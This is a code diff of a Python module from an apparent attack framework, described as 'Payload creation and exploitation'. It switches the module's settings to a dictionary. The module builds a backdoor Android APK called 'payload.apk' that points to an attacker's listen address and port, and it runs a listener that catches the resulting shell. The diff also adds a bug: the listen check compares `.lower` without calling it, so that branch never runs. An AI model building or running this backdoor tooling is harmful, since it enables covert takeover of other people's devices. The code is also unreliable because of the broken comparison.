@@ -11,14 +11,14 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.apk"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.apk"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def clearDirec():
@@ -367,16 +367,16 @@ def build(ip,port,output,icon=None):
 
 def running():
         try:
-                if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
+                if var.all_var['ltype'].lower() == "create":
                         print ("")
                         print (blue+"[*]"+default+ "Create a backdour")
                         time.sleep(2)
                         print ("")
                         time.sleep(2)
-                        build(str(var.lhost[0]),str(var.lport[0]),str(var.lname[0]))
+                        build(str(var.all_var['lhost']),str(var.all_var['lport']),str(var.all_var['lname']))
 
-                elif var.ltype[0] == "listen" or var.ltype[0] == "LISTEN":
-                        get_shell(str(var.lhost[0]),int(var.lport[0]))
+                elif var.all_var['ltype'].lower == "listen":
+                        get_shell(str(var.all_var['lhost']),int(var.all_var['lport']))
 
                 else:
                         print (red+"[-]"+default+"Choose LTYPE " )
